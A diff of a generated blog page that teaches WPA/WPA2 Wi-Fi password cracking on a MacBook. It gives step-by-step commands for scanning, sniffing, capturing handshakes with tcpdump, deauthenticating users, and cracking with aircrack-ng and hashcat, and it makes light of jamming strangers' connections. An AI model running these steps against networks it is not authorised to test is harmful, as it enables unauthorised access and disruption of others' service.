@@ -41,7 +41,7 @@
   gtag('config', 'UA-150511033-1');
 </script>
 
-<meta name="generator" content="Hexo 5.0.0"><style>mjx-container[jax="SVG"] {
+<meta name="generator" content="Hexo 5.4.2"><style>mjx-container[jax="SVG"] {
   direction: ltr;
 }
 
@@ -280,13 +280,17 @@ mjx-container[display="true"] + br {
 </ul>
 <p>What makes the retrieval of the handshake hard is that it appears only when somebody connects to the access point.</p>
 <p>The good news is that you can deauthentificate people from the wifi network - it’s called wifi jamming and it’s useful to impress a girl and piss off people at Starbucks.<br>When they reconnect, they re-send the handshake.  That adds a <strong>Deauth</strong> step.</p>
-<h2 id="Identify-the-target-with-airport"><a href="#Identify-the-target-with-airport" class="headerlink" title="Identify the target - with airport"></a><strong>Identify</strong> the target - with <code>airport</code></h2><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><pre><code>sudo ln-s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport</code></pre>
-<h3 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h3><pre><code>sudo airport -s</code></pre>
+<h2 id="Identify-the-target-with-airport"><a href="#Identify-the-target-with-airport" class="headerlink" title="Identify the target - with airport"></a><strong>Identify</strong> the target - with <code>airport</code></h2><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><pre><code>sudo ln-s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport
+</code></pre>
+<h3 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h3><pre><code>sudo airport -s
+</code></pre>
 <h2 id="Sniff-The-easy-way-with-airport"><a href="#Sniff-The-easy-way-with-airport" class="headerlink" title="Sniff - The easy way with airport"></a><strong>Sniff</strong> - The easy way with <code>airport</code></h2><pre><code>// Ctrl-C to stop capturing
 
-sudo airport en0 sniff $CHANNEL</code></pre>
+sudo airport en0 sniff $CHANNEL
+</code></pre>
 <p>It saves the <code>.cap</code> capture file and displays the path.</p>
-<h2 id="Crack-The-easy-way-with-aircrack-ng"><a href="#Crack-The-easy-way-with-aircrack-ng" class="headerlink" title="Crack - The easy way with aircrack-ng"></a><strong>Crack</strong> - The easy way with <code>aircrack-ng</code></h2><pre><code>aircrack-ng -w wordlist.txt -b $TARGET_MAC_ADDRESS airportSniff.cap</code></pre>
+<h2 id="Crack-The-easy-way-with-aircrack-ng"><a href="#Crack-The-easy-way-with-aircrack-ng" class="headerlink" title="Crack - The easy way with aircrack-ng"></a><strong>Crack</strong> - The easy way with <code>aircrack-ng</code></h2><pre><code>aircrack-ng -w wordlist.txt -b $TARGET_MAC_ADDRESS airportSniff.cap
+</code></pre>
 <p>If you don&#39;t have the beacon or the handshake, it will fail accordingly.</p>
 <p>For wordlists, see below.</p>
 <h2 id="Deauth"><a href="#Deauth" class="headerlink" title="Deauth"></a><strong>Deauth</strong></h2><p>As I said, <code>aireplay-ng</code> doesn’t work on a MacBook Pro.<br>The catch is that <code>aireplay-ng</code> can do a lot of other things besides deauth attacks.</p>
@@ -310,22 +314,27 @@ sudo tcpdump &quot;type mgt subtype beacon and ether src $BSSID&quot; -I -c 1 -i
 # wait for the WPA handshake
 sudo tcpdump &quot;ether proto 0x888e and ether host $BSSID&quot; -I -U -vvv -i en1 -w handshake.cap
 # merge the two files
-mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap</code></pre>
+mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
+</code></pre>
 <p>When you launch those lines, the first <code>tcpdump</code> easily captures a beacon and the second waits for the handshake.</p>
 <p>Use JamWiFi to deauth some users, and when <code>tcpdump</code> shows you it got 4 frames or more, Ctrl-C. It appears you can use less that 4 frames, but it depends on the frames you got (for instance 1,2 or 2,3 are sufficient). Anyway you should normally get at least 4. If nothing shows, try to deauth another user.</p>
 <p>Now you have everything in <code>capture.cap</code>. You can also run <code>aircrack-ng</code> on it.</p>
 <h2 id="Crack-The-good-way-with-hashcat"><a href="#Crack-The-good-way-with-hashcat" class="headerlink" title="Crack - The good way with hashcat"></a><strong>Crack</strong> - The good way with <code>hashcat</code></h2><p>Like <code>aireplay-ng</code>, <code>aircrack-ng</code> offers so many features that it cannot be the best in everything.</p>
 <p>We can really speed up the process by using <a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">hashcat</a>.</p>
-<h3 id="Install-with-brew"><a href="#Install-with-brew" class="headerlink" title="Install with brew"></a>Install with <a target="_blank" rel="noopener" href="https://brew.sh/">brew</a></h3><pre><code>brew install hashcat</code></pre>
+<h3 id="Install-with-brew"><a href="#Install-with-brew" class="headerlink" title="Install with brew"></a>Install with <a target="_blank" rel="noopener" href="https://brew.sh/">brew</a></h3><pre><code>brew install hashcat
+</code></pre>
 <h3 id="Convert-with-cap2hccapx"><a href="#Convert-with-cap2hccapx" class="headerlink" title="Convert with cap2hccapx"></a>Convert with cap2hccapx</h3><p><code>hashcat</code> doesn’t take cap files, only hccapx files.</p>
 <p>Just install <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat-utils">hashcat-utils</a> and use <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat-utils/blob/master/src/cap2hccapx.c">cap2hccapx</a></p>
-<pre><code>cap2hccapx capture.cap capture.hccapx</code></pre>
+<pre><code>cap2hccapx capture.cap capture.hccapx
+</code></pre>
 <p>Alternatively, use <a target="_blank" rel="noopener" href="https://hashcat.net/cap2hccapx/">this online tool</a>.</p>
 <h3 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h3><p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2">This page</a> provides some examples.</p>
 <p>To use with a dictionnary:</p>
-<pre><code>hashcat-m 2500 capture.hccapx wordlist.txt</code></pre>
+<pre><code>hashcat-m 2500 capture.hccapx wordlist.txt
+</code></pre>
 <p>You have a lot of other options, like brute force:</p>
-<pre><code>hashcat-m 2500-a3 capture.hccapx ?d?d?d?d?d?d?d?d</code></pre>
+<pre><code>hashcat-m 2500-a3 capture.hccapx ?d?d?d?d?d?d?d?d
+</code></pre>
 <p>Refer to the <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=mask_attack">documentation</a> fot more patterns.</p>
 <h3 id="Speed"><a href="#Speed" class="headerlink" title="Speed"></a>Speed</h3><p><code>hashcat</code> works on the GPU.</p>
 <p>On my MacBook Pro, it yields a performance of 5kH/s: it tests 5000 passwords in a second.</p>
